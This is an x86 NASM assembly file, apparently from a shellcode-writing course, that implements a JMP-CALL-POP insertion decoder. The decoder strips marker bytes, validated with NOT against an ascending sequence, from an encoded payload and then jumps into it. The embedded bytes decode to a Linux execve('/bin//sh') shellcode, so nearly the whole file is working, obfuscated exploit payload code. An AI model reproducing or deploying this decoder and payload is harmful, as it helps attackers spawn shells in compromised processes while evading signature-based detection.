; Filename: insertion-decoder.nasm
; Purpose: Decode encoded shellcode (insertion method using NOT and ascending hex number sequence)
global _start
section .text
_start:
    jmp short call_shellcode
setup_decoder:
    pop esi               ; esi points to encoded shellcode
    lea edi, [esi +1]     ; load esi+1 into edi
    xor eax, eax          ; zero out to prevent nulls
    xor ebx, ebx
    xor ecx, ecx
    mov al, 1             ; for incrementing postion of esi later
    mov cl, 1             ; for xoring not decoded byte later
decoder: 
    mov bl, byte [esi + eax]   ; move encoded insertion byte into bl
    not bl                     ; bitwise not to decode byte
    xor bl, cl                 ; xor values, if equal sets zero flag
    jnz short EncodedShellcode ; jumps if decoding done i.e. 0xaa
    inc cl                     ; for ascending hex sequence
    mov bl, byte [esi + eax + 1]  ; move byte after insertion byte
    mov byte [edi], bl            ; override value at edi with bl
    inc edi                       ; increment edi one byte
    add al, 2                     ; increment al two bytes
    jmp short decoder


call_shellcode:
   call setup_decoder
   EncodedShellcode: db 0x31,0xfe,0xc0,0xfd,0x50,0xfc,0x68,0xfb,0x2f,0xfa,0x2f,0xf9,0x73,0xf8,0x68,0xf7,0x68,0xf6,0x2f,0xf5,0x62,0xf4,0x69,0xf3,0x6e,0xf2,0x89,0xf1,0xe3,0xf0,0x50,0xef,0x89,0xee,0xe2,0xed,0x53,0xec,0x89,0xeb,0xe1,0xea,0xb0,0xe9,0x0b,0xe8,0xcd,0xe7,0x80,0xe6,0xaa,0xaa
